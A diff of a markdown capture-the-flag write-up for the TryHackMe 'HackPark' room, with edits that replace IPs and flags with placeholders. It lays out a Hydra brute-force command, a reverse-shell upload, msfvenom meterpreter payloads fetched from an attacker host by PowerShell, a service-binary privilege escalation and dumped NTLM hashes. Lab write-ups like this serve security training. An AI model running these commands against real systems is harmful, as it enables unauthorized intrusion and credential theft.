@@ -10,7 +10,7 @@
 
   ```
   Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 14:00 EDT
-Nmap scan report for 10.10.159.78
+Nmap scan report for [machineIP]
 Host is up (0.14s latency).
 Not shown: 998 filtered ports
 PORT     STATE SERVICE            VERSION
@@ -31,7 +31,7 @@ Nmap done: 1 IP address (1 host up) scanned in 95.03 seconds
 
   ```
 
-  While that is running we check out the webserver that is talked about that looks like this:
+  While that is running we also can check out the webserver here:
 
   ![hackparkwebpage](2)
 
@@ -39,6 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 95.03 seconds
 
   Lets also throw a gobuster in the background while we check out the next portion with
   `gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://[machineIP]`
+
 
 ### 2. Using Hydra to brute-force a login
   We can see by checking out the login page in the network tab on Firefox that it sends a
@@ -59,14 +60,14 @@ checks for an *invalid* or *valid* login - any exception to this is counted
 as a success.
  So for our hydra request we are using
  1: /Account/login.aspx
- 2: Params we find in burpsuite repeater ( via proxying a login request via Burp Proxy, sending it to Burp Repeater via Ctrl+R Then copying its params given over to our pending request  )
- 3: "Login Failed"
+ 2:  Request Params we find in burpsuite repeater ( via proxying a login request to the website via Burp Proxy, sending it to Burp Repeater via Ctrl+R, Then copying its request params given over to our command )
+ 3: "Login Failed" (Our "common case", what is expected if it doesnt see "Login Failed" it will return a success.)
 
-  `hydra -v -l admin -P /usr/share/wordlists/rockyou.txt 10.10.128.86 http-post-form "/Account/login.aspx:__VIEWSTATE=%2BzSkE5rKklYx2evyff1oZJyuSWT7%2FP%2BrwCqOuY9eQFnN3I9b9H%2FemK0b4edjD%2BX4D0kYN6MJXUIltXwXt0PReeyBxoseUQg%2BlNpW6CHIGWNzl%2FGSvdwSZX179PJ%2FI3%2F64LNM7KzKj9sc4BMO83WdCE0KH%2FPjXAKd4RAQ7poy1tOiO7cd&__EVENTVALIDATION=8UPWUPAn6s7hJvO0Pl8kCCO3NAmIgs7nlpsgIlY%2FBUKl7fwtvPmUalPJ5PygYkVuz1H356PzRXwi%2FHQ3z8iJpgXHs8%2BloBQ4qlIePP6FdcvcR2qoLptuS0C5xNkNhrzvN5IJshWQx%2BF3kjK4PfMhuSyiPjbKZA2aFsYrqvz5b2BHveGR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"`
+  `hydra -v -l admin -P /usr/share/wordlists/rockyou.txt [machineIP] http-post-form "/Account/login.aspx:__VIEWSTATE=%2BzSkE5rKklYx2evyff1oZJyuSWT7%2FP%2BrwCqOuY9eQFnN3I9b9H%2FemK0b4edjD%2BX4D0kYN6MJXUIltXwXt0PReeyBxoseUQg%2BlNpW6CHIGWNzl%2FGSvdwSZX179PJ%2FI3%2F64LNM7KzKj9sc4BMO83WdCE0KH%2FPjXAKd4RAQ7poy1tOiO7cd&__EVENTVALIDATION=8UPWUPAn6s7hJvO0Pl8kCCO3NAmIgs7nlpsgIlY%2FBUKl7fwtvPmUalPJ5PygYkVuz1H356PzRXwi%2FHQ3z8iJpgXHs8%2BloBQ4qlIePP6FdcvcR2qoLptuS0C5xNkNhrzvN5IJshWQx%2BF3kjK4PfMhuSyiPjbKZA2aFsYrqvz5b2BHveGR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"`
 
   After running for a bit we get a result
 
-  `[80][http-post-form] host: 10.10.128.86   login: admin   password: 1qaz2wsx`
+  `[80][http-post-form] host: 10.10.128.86   login: admin   password: [REDACTED]`
 
   Logging in on the log-on page we gain access the Administrator account
 
@@ -82,38 +83,38 @@ as a success.
 
    We also need to rename the edited file to `PostView.ascx` per the instructions.
 
-  Then upload the edited file using then link in the image
+  Then upload the edited file using the link in the image
   ![filemanagerbutton](6)
 
   After uploading we can then browse to `http://[machineIP]/?theme=../../App_Data/files`
-  to execute the reverse shell and return to your waiting nc session.
+  to execute the reverse shell, go back to the terminal with nc session and there should be a command prompt for you.
 
   We can quickly run `whoami` to get the results
   ```
   iis apppool\blog
   ```
-## 3. Task 3
+  and confirm access on the machine.
+## 3. Compromise the machine
 
-  Now that we have our reverse shell lets upgrade it to a full reverse shell
+  Now that we have our reverse shell lets upgrade it to a full reverse shell.
+
    To best do that, lets use MSF again. Using `msfvenom` we can quickly create reverse handlers
    with hosts and ports baked in.
    To do that we setup
-   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.30.155 LPORT=4556 -f exe > reverse.exe`
+   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[vpnIP] LPORT=[LPORT] -f exe > reverse.exe`
 
-   /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+   Now that we have that lets setup a meterpreter handler in another terminal to accept it.
 
-   Now that we have that lets setup a meterpreter handler in another terminal to accept it
+   Loading up `msfconsole` and  run `use exploit/multi/handler`
 
-   Loading up `msfconsole` and `use exploit/multi/handler`
-
-   Set the correct options for your machine and the go back to the cmd shell, move over to the `C:\Windows\temp` to copy over your reverse_tcp shell exe and run it
+   Set the correct options for your machine ( by using `options` then `set [option]` for required) then go back to the cmd shell, move over to the `C:\Windows\temp` to copy over your reverse_tcp shell exe and run it.
 
    `powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe`
 
    run it by just typing `reverse.exe` and you should see it come into your meterpreter terminal
    See what session it is with `sessions -l` then take control with `sessions -i [id]` to take over that shell.
 
-   We can see by running the meterpreter command `sysinfo` we get this information
+   We can see by running the meterpreter command `sysinfo` we get certain information.
    ```
    meterpreter > sysinfo
 Computer        : HACKPARK
@@ -124,7 +125,7 @@ Domain          : WORKGROUP
 Logged On Users : 1
 Meterpreter     : x86/windows
    ```
-   running `ps` to see what processes are running we seeing
+   running `ps` to see what processes are running.
    ```
    meterpreter > ps
 
@@ -186,7 +187,7 @@ Process List
    Once we get that info lets run it through our recommended `windows-privilege-escalation` script to see what we get.
 
    We have to first update the database with `./windows-exploit-suggester.py --update`
-   After that we run `windows-exploit-suggester.py -d ~/tools/Windows-Exploit-Suggester/2020-03-20-mssb.xls --systeminfo hackpack_sysinfo.txt` with `hackpack_sysinfo.txt` containing the output of `systeminfo` from the msfconsole.
+   After that we run `windows-exploit-suggester.py -d [databasePath] --systeminfo [systeminfotxtPath]` with `[systeminfotxtPath]` containing the output of `systeminfo` from the msfconsole.
 
   We can see the results [here](7)
 
@@ -195,21 +196,23 @@ Process List
 
   While running though through the `ps` command we see that a `Message.exe` keeps running then shutting down within the services.
 
-  So additional combing through the log we can find the update logs of the `System Scheduler Professional - Version 5.12` which has a vulnerability to replacing its service with a vulnerable exe with the same name and it will eventually call out to our handler with a hopefully privledged shell. This is explained more [here](8). https://www.exploit-db.com/exploits/45072
+  So additional combing through the log we can find the update logs of the `System Scheduler Professional - Version 5.12` which has a vulnerability to replacing its service with a vulnerable exe with the same name and it will eventually call out to our handler with a hopefully privileged shell. This is explained more [here](8). https://www.exploit-db.com/exploits/45072
 
-  First lets setup another Metasploit handler by backgrounding our current session set another LPORT then exploit in a background sessions with `exploit -j`
+  First lets setup another Metasploit handler by backgrounding(`ctrl+z`) our current session, set another [LPORT] then exploit in a background session with `exploit -j`.
+
   Then lets generate another binary named `Message.exe` with msfvenom using
-  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.30.155 LPORT=8978 -f exe > Message.exe`
-  then transfer it over with
-  `powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/Message.exe -Outfile Message.exe`
-  After uploading that into the correct directory, once it executes it you should get the meterpreter shell. Running `getuid` you get `Server username: HACKPARK\Administrator`. From
+  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[vpnIP] LPORT=[LPORT2] -f exe > Message.exe`
+  then download it over to the hackpark machine with
+  `powershell Invoke-WebRequest -Uri http://[vpnIP]:[LPORT2]/Message.exe -Outfile Message.exe`
+
+  After uploading that into the correct directory(search for that program directory to find where to replace at.), once it executes it you should get the meterpreter shell. Running `getuid` you get `Server username: HACKPARK\Administrator`. From
   there we can explore the machine more convert to System if wanted. However Administrator is good enough for us for now and we can complete the box.
 
-  Going to `c:\Users\jeff\Desktop\user.txt` we get `759bd8af507517bcfaede78a21a73e39`
-  then going into `c:\Users\Administrator\Desktop\root.txt` we get `7e13d97f05f7ceb9881a3eb3d78d3e72`
+  Going to `c:\Users\jeff\Desktop\user.txt` we get `[REDACTED]`
+  then going into `c:\Users\Administrator\Desktop\root.txt` we get `[REDACTED]`
 
   We can also try to find the service that was running Message.exe by enumerating a bit further with powershell & tasklist.
-
+a
   TO also further exploit I got the hashes for every user to exploit if I needed
   ```
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:3352c0731470aabf133e0c84276adcba:::
@@ -217,10 +220,13 @@ Process List
   jeff:1001:aad3b435b51404eeaad3b435b51404ee:e7dd0bd78b1d5d7eea4ee746816e2377:::
   ```
 
-but after searching and reviewing the exploit page again I tried `WindowsScheduler.exe` and that worked. This is from putting together the ServiceName `WindowsScheduler` with `wservice.exe` to get the final name which works.
+but after searching and reviewing the exploit page again, trying to find the *service* name we are exploiting. I looked into service enumeration with the metasploit module `use Post/Windows/Gather/Enum_Services`. After running this and seeing the output I saw that the service name isnt always the .exe name. But if you combine the two you can get the service.exe you are looking for.
+
 ## Review
 
-For links
+Overall this box was a good test of skills in the OSCP path. Even with a writeup it still would be difficult to
+do this without much experience. The questions for the box are a little weird on this one, however keep trying what it SHOULD BE and trust there is a solution. (Remember the stars correspond to the length of the flag in TryHackMe. )
+
 [1]: https://tryhackme.com/room/hackpark
 [2]: ./resources/hackpark_web80.png
 [3]: ./resource/hackpark_aspxlogin80.png
